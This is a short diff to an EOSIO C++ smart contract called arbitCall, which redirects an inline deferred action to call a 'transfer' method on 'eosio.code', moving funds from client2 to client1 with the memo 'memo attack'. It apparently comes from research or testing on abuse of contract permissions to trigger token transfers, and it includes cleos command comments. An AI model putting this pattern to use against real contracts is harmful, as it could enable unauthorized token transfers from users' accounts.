@@ -55,14 +55,15 @@ class [[eosio::contract]] arbitCall: public contract{
             //name targetContract = "client1"_n;
             //name method         = "main"_n;
 
-            name targetContract = name("client2");
-            name method         = name("main");
+            name targetContract = name("eosio.code");
+            name method         = name("transfer");
 
             
             //cleos push action client1  addfilebytes '[2,"aa22222222a",5]' -p client   // danakilblock contract 
             //out1.actions.emplace_back(permission_level{_self, "active"_n}, targetContract , method , std::make_tuple(idx,"AAAAAAAAAAAAAAAAAAAAAAAAAA",22));
             //cleos push action eosio.token transfer '["client1","client2","1.0000 EOS","memo"]' -p client1
-            out1.actions.emplace_back(permission_level{_self, "active"_n}, targetContract , method , std::make_tuple(name("client2"),idx,t));
+			//out1.actions.emplace_back(permission_level{_self, "active"_n}, targetContract , method , std::make_tuple(name("client2"),idxa,t));
+            out1.actions.emplace_back(permission_level{_self, "active"_n}, targetContract , method , std::make_tuple(name("client2"),name("client1"),t,"memo attack"));
             out1.send( idx+1, _self, false);
             print("[#] Send To Target Contract ");
         }
